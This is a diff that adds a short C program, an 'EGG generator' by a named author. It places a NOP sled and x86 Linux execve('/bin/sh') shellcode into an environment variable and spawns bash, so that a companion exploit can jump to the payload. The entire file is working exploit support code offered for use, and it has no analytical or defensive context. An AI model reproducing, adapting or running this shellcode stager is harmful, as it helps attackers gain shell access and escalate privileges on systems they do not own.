@@ -1,0 +1,37 @@
+/*
+** EGG generator bY SpikE <spike_vrm@mail.com>
+**
+** Usage: Execute this file before running the exploit
+**
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#define EGGSIZE 300
+
+char Shellcode[] =
+        "AAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+
+        "\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
+ "\x4e\x08\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+int main()
+{
+ char EGG[EGGSIZE];
+ char *EGGPtr;
+ u_long EGGAddr;
+
+
+ printf("[+] Creating EGG\n");
+
+ memset(EGG,0,EGGSIZE);
+ memcpy(EGG,Shellcode,strlen(Shellcode));
+ memcpy(EGG,"spkEGG=",7);
+ putenv(EGG);
+
+ system("/bin/bash");
+}
+
